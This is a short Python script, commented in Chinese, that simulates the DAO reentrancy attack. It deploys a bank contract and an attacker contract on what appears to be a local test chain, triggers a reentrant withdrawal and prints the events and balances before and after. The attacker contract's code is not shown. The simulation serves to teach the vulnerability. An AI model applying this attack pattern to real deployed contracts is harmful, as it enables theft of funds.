# DAO攻击模拟执行脚本
# python web3_deploy.py 执行

from web3_deploy import *

# 编译并部署银行合约
compile("Bank")
abi = read_file("Bank/Bank.abi")
bytecode = read_file("Bank/Bank.bin")
ct = eth.contract(abi=abi, bytecode=bytecode)
# 传入定量的以太币作为金额
tx_hash = ct.constructor().transact({'value': 10000})   
tx_receipt = eth.waitForTransactionReceipt(tx_hash)
bank = eth.contract(address=tx_receipt.contractAddress, abi=abi)

# 银行余额
print("eth.get_balance(bank.address):", eth.get_balance(bank.address))

# 编译并部署攻击者合约
attacker = compile_and_deploy("BankAttacker", tx_receipt.contractAddress, False)
# 攻击者向银行存入一笔金额
attacker.functions.deposit().transact({"value": 2000})
# 打印金额进入事件
print("bank.events.In.getLogs():", bank.events.In.getLogs()) 
print()

# 银行余额
print("eth.get_balance(bank.address):", eth.get_balance(bank.address))
print()

# 攻击者取出所有金额，同时触发
attacker.functions.withdraw().transact()

# 打印金额输出事件，因为攻击的原因，可能会有多次输出
print("bank.events.Out.getLogs():")
for log in bank.events.Out.getLogs():  
    print(log)
print()

# 打印攻击日志
print("attack log:")
for log in attacker.events.Attack.getLogs():
    print(log)
print()

# 打印攻击后的银行余额和合约余额
print("eth.get_balance(bank.address):", eth.get_balance(bank.address))
print("eth.get_balance(attacker.address):", eth.get_balance(attacker.address))


